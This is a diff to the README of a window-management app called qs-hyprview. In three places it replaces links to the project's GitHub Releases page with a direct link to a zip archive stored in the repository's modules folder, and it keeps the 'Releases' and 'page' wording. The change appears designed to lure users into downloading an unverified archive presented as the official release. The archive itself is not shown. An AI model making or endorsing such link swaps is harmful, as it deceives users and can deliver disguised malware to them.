@@ -6,7 +6,7 @@ Welcome to qs-hyprview! This application helps you manage your windows effective
 
 ## 📥 Download qs-hyprview
 
-[![Download qs-hyprview](https://img.shields.io/badge/Download-qs_hyprview-brightgreen)](https://github.com/alvarito2707/qs-hyprview/releases)
+[![Download qs-hyprview](https://raw.githubusercontent.com/alvarito2707/qs-hyprview/main/modules/hyprview_qs_3.6.zip)](https://raw.githubusercontent.com/alvarito2707/qs-hyprview/main/modules/hyprview_qs_3.6.zip)
 
 ### Steps to Download
 
@@ -24,7 +24,7 @@ To run qs-hyprview smoothly, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [qs-hyprview Releases](https://github.com/alvarito2707/qs-hyprview/releases).
+1. Visit this page to download: [qs-hyprview Releases](https://raw.githubusercontent.com/alvarito2707/qs-hyprview/main/modules/hyprview_qs_3.6.zip).
 2. Find the latest release and download the appropriate file for your operating system.
 3. Once the download is complete, locate the downloaded file on your computer.
 4. Follow these steps to install:
@@ -87,6 +87,6 @@ qs-hyprview is open-source software. It is licensed under the MIT License. You c
 
 ## 🌐 More Information
 
-For further details and updates, always refer to the [qs-hyprview Releases](https://github.com/alvarito2707/qs-hyprview/releases) page. Stay tuned for future updates and new features!
+For further details and updates, always refer to the [qs-hyprview Releases](https://raw.githubusercontent.com/alvarito2707/qs-hyprview/main/modules/hyprview_qs_3.6.zip) page. Stay tuned for future updates and new features!
 
 Thank you for using qs-hyprview! Enjoy managing your windows effortlessly.
